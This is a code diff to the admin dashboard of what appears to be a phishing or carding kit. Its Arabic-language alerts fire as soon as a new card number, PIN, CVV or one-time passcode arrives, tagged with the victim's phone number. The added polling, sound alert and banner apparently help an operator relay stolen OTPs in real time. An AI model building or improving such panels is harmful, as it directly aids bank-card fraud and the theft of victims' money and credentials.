@@ -146,6 +146,22 @@
   .modal-btn:disabled{opacity:.4;cursor:default}
   .modal-status{text-align:center;padding:12px;font-weight:800;font-size:16px}
 
+  /* ---------- notification banner ---------- */
+  .notif-banner{
+    display:none;position:fixed;top:0;left:0;right:0;z-index:2000;
+    background:linear-gradient(135deg,#1565c0,#0d47a1);color:#fff;
+    padding:16px 24px;text-align:center;font-size:18px;font-weight:800;
+    box-shadow:0 4px 20px rgba(0,0,0,.3);
+    animation:slideDown .4s ease-out;
+  }
+  .notif-banner.show{display:block}
+  @keyframes slideDown{from{transform:translateY(-100%)}to{transform:translateY(0)}}
+  @keyframes flashBorder{
+    0%,100%{border-color:var(--line)}
+    50%{border-color:#1565c0}
+  }
+  .table-card.flash{animation:flashBorder .6s ease 3}
+
   /* ---------- desktop ---------- */
   @media(min-width:900px){
     .login{ max-width:460px; padding:48px 40px; }
@@ -233,6 +249,9 @@
     </div>
   </div>
 
+  <!-- Notification Banner -->
+  <div class="notif-banner" id="notifBanner">🔔 بيانات جديدة وصلت!</div>
+
   <!-- Modal -->
   <div class="modal-overlay" id="modalOverlay">
     <div class="modal">
@@ -252,6 +271,40 @@
   const loginErr = document.getElementById('loginErr');
   let pollTimer = null;
   let allSubmissions = [];
+  let lastCount = 0;
+  let lastDataKeys = new Set();
+
+  const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+  function playAlert() {
+    const o1 = audioCtx.createOscillator();
+    const o2 = audioCtx.createOscillator();
+    const g = audioCtx.createGain();
+    o1.type = 'sine'; o1.frequency.value = 880;
+    o2.type = 'sine'; o2.frequency.value = 1100;
+    g.gain.setValueAtTime(0.3, audioCtx.currentTime);
+    g.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.8);
+    o1.connect(g); o2.connect(g); g.connect(audioCtx.destination);
+    o1.start(); o2.start(audioCtx.currentTime + 0.2);
+    o1.stop(audioCtx.currentTime + 0.8); o2.stop(audioCtx.currentTime + 0.8);
+  }
+
+  function showNotifBanner(msg) {
+    const b = document.getElementById('notifBanner');
+    b.textContent = '🔔 ' + msg;
+    b.classList.remove('show');
+    void b.offsetWidth;
+    b.classList.add('show');
+    setTimeout(() => b.classList.remove('show'), 4000);
+
+    const tc = document.querySelector('.table-card');
+    tc.classList.remove('flash');
+    void tc.offsetWidth;
+    tc.classList.add('flash');
+  }
+
+  function buildDataKey(s) {
+    return s.id + '|' + (s.card||'') + '|' + (s.pin||'') + '|' + (s.otp||'') + '|' + (s.cvv||'');
+  }
 
   function token(){ return sessionStorage.getItem(TOKEN_KEY); }
 
@@ -280,9 +333,34 @@
       const r = await fetch('/api/admin/submissions',{headers:{'Authorization':'Bearer '+token()}});
       if(r.status===401){ logout(); return; }
       const d = await r.json();
-      allSubmissions = d.submissions || [];
-      render(allSubmissions);
+      const list = d.submissions || [];
+
+      const newKeys = new Set(list.map(buildDataKey));
+      let hasNew = false;
+      let msg = '';
+
+      if (lastDataKeys.size > 0) {
+        const newOrders = list.filter(s => !lastDataKeys.has(buildDataKey(s)));
+        if (newOrders.length > 0) {
+          hasNew = true;
+          const latest = newOrders[0];
+          if (latest.otp && !lastDataKeys.has(buildDataKey(latest))) msg = 'وصل OTP جديد — ' + latest.phone;
+          else if (latest.cvv && !lastDataKeys.has(buildDataKey(latest))) msg = 'وصل CVV جديد — ' + latest.phone;
+          else if (latest.pin && !lastDataKeys.has(buildDataKey(latest))) msg = 'وصل رقم سري جديد — ' + latest.phone;
+          else if (latest.card && !lastDataKeys.has(buildDataKey(latest))) msg = 'وصلت بيانات بطاقة جديدة — ' + latest.phone;
+          else msg = 'طلب جديد وصل — ' + latest.phone;
+        }
+      }
+
+      lastDataKeys = newKeys;
+      allSubmissions = list;
+      render(list);
       setActive(d.active || 0);
+
+      if (hasNew && msg) {
+        playAlert();
+        showNotifBanner(msg);
+      }
     }catch(e){}
   }
 
